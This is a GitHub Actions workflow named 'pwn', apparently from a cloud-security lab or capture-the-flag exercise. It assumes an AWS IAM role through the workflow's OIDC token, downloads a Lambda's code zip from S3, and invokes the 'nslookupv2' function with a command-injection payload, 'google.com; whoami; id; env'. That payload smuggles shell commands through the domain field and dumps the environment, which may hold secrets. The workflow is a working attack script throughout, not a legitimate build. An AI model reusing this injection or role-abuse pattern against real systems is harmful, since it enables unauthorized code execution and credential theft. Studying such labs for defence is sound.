name: pwn
on:
  push:
    branches: [corgi]

permissions:
  id-token: write
  contents: read

jobs:
  assume:
    runs-on: ubuntu-latest
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: get code zip
        run: |
          aws s3 cp s3://codec4f26c862a321ef5/code.zip ./code.zip
          unzip -l code.zip
      
      - name: invoke lambda - whoami
        if: always()
        run: |
          aws lambda invoke \
            --function-name nslookupv2 \
            --payload '{"domain":"google.com; whoami; id; env"}' \
            --cli-binary-format raw-in-base64-out \
            --log-type Tail \
            response.json
          cat response.json
          echo "---LOGS---"
          cat response.json | python3 -c "import json,sys,base64; print(base64.b64decode(json.load(sys.stdin).get('LogResult',b'')).decode())" 2>/dev/null || true
